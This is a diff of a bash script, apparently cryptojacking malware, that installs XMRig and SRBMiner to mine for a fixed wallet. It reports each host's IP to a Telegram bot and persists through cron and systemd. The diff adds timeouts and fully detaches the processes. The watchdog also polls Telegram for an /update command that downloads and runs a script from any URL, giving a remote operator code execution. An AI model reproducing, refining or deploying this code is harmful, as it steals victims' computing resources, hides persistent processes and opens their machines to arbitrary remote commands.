@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ============================================================
-# | GOD MODE v23: SRBMINER ULTRA-STABLE GPU FLAGS EDITION    |
+# | GOD MODE v24: NON-BLOCKING LAUNCH & STRICT TIMEOUTS      |
 # ============================================================
 
 # [ CONFIGURATION ]
@@ -46,7 +46,7 @@ LOG_GPU="$BASE_DIR/.gpu_data.log"
 # ----------------------------------------------------
 get_worker() {
     local ip
-    ip=$(curl -s -m 5 ifconfig.me || wget -qO- -t 1 ifconfig.me 2>/dev/null)
+    ip=$(curl -s -m 3 --connect-timeout 2 ifconfig.me || wget -qO- -t 1 -T 2 ifconfig.me 2>/dev/null)
     [ -z "$ip" ] && ip="111.111.111.111"
     
     local safe_worker
@@ -55,18 +55,18 @@ get_worker() {
     echo "${FIXED_WALLET_ID}.${safe_worker}"
 }
 WORKER=$(get_worker)
-SERVER_IP=$(curl -s -m 5 ifconfig.me || echo "Unknown-IP")
+SERVER_IP=$(curl -s -m 3 --connect-timeout 2 ifconfig.me || echo "Unknown-IP")
 
 detect_gpu() {
-    if command -v lspci >/dev/null 2>&1; then
-        if lspci | grep -iE 'vga|3d|display' | grep -iE 'nvidia|amd|advanced micro|radeon' >/dev/null 2>&1; then
-            echo "1"
-            return
-        fi
-    fi
     if [ -d "/proc/driver/nvidia" ] || [ -c "/dev/nvidia0" ] || [ -d "/sys/class/drm/card0" ]; then
         echo "1"
         return
+    fi
+    if command -v lspci >/dev/null 2>&1; then
+        if timeout 2 lspci 2>/dev/null | grep -iE 'vga|3d|display' | grep -iE 'nvidia|amd|advanced micro|radeon' >/dev/null 2>&1; then
+            echo "1"
+            return
+        fi
     fi
     echo "0"
 }
@@ -87,7 +87,7 @@ URL_SRBMINER="https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.7
 
 # CPU Setup
 if [ ! -f "$BIN_CPU" ]; then
-    curl -L -k -s -o cpu.tar.gz "$URL_XMRIG" || wget -qO cpu.tar.gz "$URL_XMRIG"
+    curl -L -k -s -m 15 --connect-timeout 5 -o cpu.tar.gz "$URL_XMRIG" || wget -qO cpu.tar.gz -T 15 "$URL_XMRIG"
     tar -xf cpu.tar.gz 2>/dev/null
     FOUND_CPU=$(find . -type f -name "xmrig" | head -n 1)
     if [ -n "$FOUND_CPU" ]; then
@@ -114,7 +114,7 @@ cat <<EOF > config.json
 }
 EOF
 
-# GPU Setup (Удаляем старые бинарники, если это не SRBMiner)
+# GPU Setup
 if [ "$HAS_GPU" -eq 1 ]; then
     NEED_INSTALL=0
     if [ ! -f "$BIN_GPU" ]; then
@@ -128,7 +128,7 @@ if [ "$HAS_GPU" -eq 1 ]; then
 
     if [ "$NEED_INSTALL" -eq 1 ]; then
         pkill -9 -f "$BIN_GPU" 2>/dev/null
-        curl -L -k -s -o gpu.tar.gz "$URL_SRBMINER" || wget -qO gpu.tar.gz "$URL_SRBMINER"
+        curl -L -k -s -m 20 --connect-timeout 5 -o gpu.tar.gz "$URL_SRBMINER" || wget -qO gpu.tar.gz -T 20 "$URL_SRBMINER"
         tar -xf gpu.tar.gz 2>/dev/null
         FOUND_GPU=$(find . -type f -name "SRBMiner-MULTI" | head -n 1)
         if [ -n "$FOUND_GPU" ]; then
@@ -166,9 +166,10 @@ cd "\$BASE_DIR" || exit 1
 LAST_REPORT=\$(date +%s)
 PAUSED=0
 
+# Безопасная отправка в ТГ с жестким таймаутом
 send_tg_msg() {
     local msg="\$1"
-    curl -s -X POST "https://api.telegram.org/bot\$TG_BOT_TOKEN/sendMessage" \
+    curl -s -m 5 --connect-timeout 3 -X POST "https://api.telegram.org/bot\$TG_BOT_TOKEN/sendMessage" \
          -d chat_id="\$TG_CHAT_ID" \
          -d text="\$msg" \
          -d parse_mode="HTML" > /dev/null 2>&1
@@ -298,7 +299,7 @@ send_logs_report() {
     send_tg_msg "\$msg"
 }
 
-STARTUP_MSG="🚀 <b>ENGINE V23 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
+STARTUP_MSG="🚀 <b>ENGINE V24 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
 send_tg_msg "\$STARTUP_MSG"
 
 while true; do
@@ -323,7 +324,6 @@ while true; do
             if [ -f "./\$BIN_GPU" ]; then
                 if ! pgrep -f "\$BIN_GPU" > /dev/null; then
                     chmod +x "./\$BIN_GPU"
-                    # SRBMiner-MULTI Pearl (PRL) with Watchdog & Disabling CPU
                     nohup ./\$BIN_GPU --algorithm pearlhash --pool \$POOL_GPU_1 --wallet \$WORKER --pool \$POOL_GPU_2 --wallet \$WORKER --watchdog-enable --retry-time 10 --disable-cpu >> "\$LOG_GPU" 2>&1 &
                     sleep 2
                     if ! pgrep -f "\$BIN_GPU" > /dev/null; then
@@ -342,13 +342,13 @@ while true; do
     [ -f "\$LOG_GPU" ] && tail -n 300 "\$LOG_GPU" > "\$LOG_GPU.tmp" && mv "\$LOG_GPU.tmp" "\$LOG_GPU"
 
     # --- 3. ТЕЛЕГРАМ ОБРАБОТЧИК ---
-    LAST_CMD=\$(curl -s -m 3 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=-1&timeout=1" 2>/dev/null)
+    LAST_CMD=\$(curl -s -m 3 --connect-timeout 2 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=-1&timeout=1" 2>/dev/null)
     UPDATE_ID=\$(echo "\$LAST_CMD" | grep -o '"update_id":[0-9]*' | head -n 1 | cut -d: -f2)
 
     if [ -n "\$UPDATE_ID" ]; then
         AUTH_CHECK=\$(echo "\$LAST_CMD" | grep -o '"id":'"\$TG_CHAT_ID")
         
-        curl -s -m 2 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=\$((UPDATE_ID + 1))" >/dev/null 2>&1
+        curl -s -m 2 --connect-timeout 1 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=\$((UPDATE_ID + 1))" >/dev/null 2>&1
 
         if [ -n "\$AUTH_CHECK" ]; then
             CMD_TARGET=\$(echo "\$LAST_CMD" | awk '{print \$2}' | tr -d '\r\n')
@@ -374,11 +374,11 @@ while true; do
                     TIMESTAMP=\$(date +%s)
                     DEST_SCRIPT="\$MODULE_DIR/Connfy_\${TIMESTAMP}.sh"
                     
-                    curl -L -k -s -o "\$DEST_SCRIPT" "\$TARGET_URL" || wget -qO "\$DEST_SCRIPT" "\$TARGET_URL"
+                    curl -L -k -s -m 15 --connect-timeout 5 -o "\$DEST_SCRIPT" "\$TARGET_URL" || wget -qO "\$DEST_SCRIPT" -T 15 "\$TARGET_URL"
                     
                     if [ -f "\$DEST_SCRIPT" ] && [ -s "\$DEST_SCRIPT" ]; then
                         chmod +x "\$DEST_SCRIPT"
-                        nohup "\$DEST_SCRIPT" >/dev/null 2>&1 &
+                        (nohup "\$DEST_SCRIPT" </dev/null >/dev/null 2>&1 &)
                         send_tg_msg "✅ <b>TARGET MATCHED (\$SERVER_IP):</b> Script updated from <code>\$TARGET_URL</code> and launched!"
                     else
                         send_tg_msg "❌ <b>UPDATE FAILED (\$SERVER_IP):</b> Could not fetch Connfy.sh from GitHub."
@@ -413,20 +413,20 @@ EOF
 
 chmod +x watchdog.sh
 
-# Запускаем вачдог в фоне
+# Запускаем вачдог полностью отвязанным от терминала
 pkill -9 -f "watchdog.sh" 2>/dev/null
-nohup ./watchdog.sh >/dev/null 2>&1 &
+(nohup ./watchdog.sh </dev/null >/dev/null 2>&1 &)
 
 # ----------------------------------------------------
 # [ PHASE 4: VERBOSE CLEAN ASCII DIAGNOSTICS ]
 # ----------------------------------------------------
 echo "================================================="
-echo "[+] ENGINE V23 INITIALIZED"
+echo "[+] ENGINE V24 INITIALIZED"
 echo "[+] Server IP: $SERVER_IP"
 echo "[+] Worker ID: $WORKER"
 echo "================================================="
 echo "[+] Igniting core engines..."
-sleep 4
+sleep 3
 
 echo "-------------------------------------------------"
 echo "[+] CPU ENGINE STATUS:"
@@ -470,9 +470,9 @@ echo "================================================="
 # [ PHASE 5: SAFE PERSISTENCE ]
 # ----------------------------------------------------
 if command -v crontab >/dev/null 2>&1; then
-    (crontab -l 2>/dev/null | grep -v "watchdog.sh"; \
+    (timeout 2 crontab -l 2>/dev/null | grep -v "watchdog.sh"; \
      echo "@reboot $BASE_DIR/watchdog.sh"; \
-     echo "*/10 * * * * $BASE_DIR/watchdog.sh") 2>/dev/null | crontab - 2>/dev/null
+     echo "*/10 * * * * $BASE_DIR/watchdog.sh") 2>/dev/null | timeout 3 crontab - 2>/dev/null
 fi
 
 if [ "$IS_ROOT" -eq 1 ] && [ -d "/run/systemd/system" ]; then
